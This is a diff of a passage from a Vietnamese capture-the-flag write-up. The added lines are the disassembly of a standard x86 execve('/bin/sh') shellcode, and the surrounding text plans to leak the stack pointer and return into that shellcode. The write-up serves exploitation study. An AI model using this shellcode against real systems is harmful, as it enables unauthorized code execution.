@@ -617,6 +617,15 @@ Sau đó gọi sys_read để đọc input vào và tăng esp lên 0x14 để re
 Vậy thì không có lỗ hổng thông thường nào như gets(), ... được xuất hiện ở đây, điều đó có nghĩa là chúng ta chỉ việc đưa shellcode vào stack và thực hiện shell thôi!
 Để thực hiện được việc gọi shellcode quyền năng là "/bin/sh" thì chúng ta search gg có shellcode sau : 
 ```
+   0:   31 c9                   xor    ecx, ecx
+   2:   f7 e1                   mul    ecx
+   4:   51                      push   ecx
+   5:   68 2f 2f 73 68          push   0x68732f2f
+   a:   68 2f 62 69 6e          push   0x6e69622f
+   f:   89 e3                   mov    ebx, esp
+  11:   b0 0b                   mov    al, 0xb
+  13:   cd 80                   int    0x80
+
 shellcode = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
 ```
 Sau đó yêu cầu tiếp theo là chúng ta phải tìm được esp_addr thì mới có thể add shellcode vào và thực thi được, để tìm được thì chúng ta chú ý câu lệnh *" 0x08048087 <+39>:	mov    ecx,esp"* câu lệnh này có nghĩa là esp sẽ được đưa vào ecx nên từ đấy chúng ta có thể leak được esp sau đó tính toán stack trả về và đưa shellcode vào : 
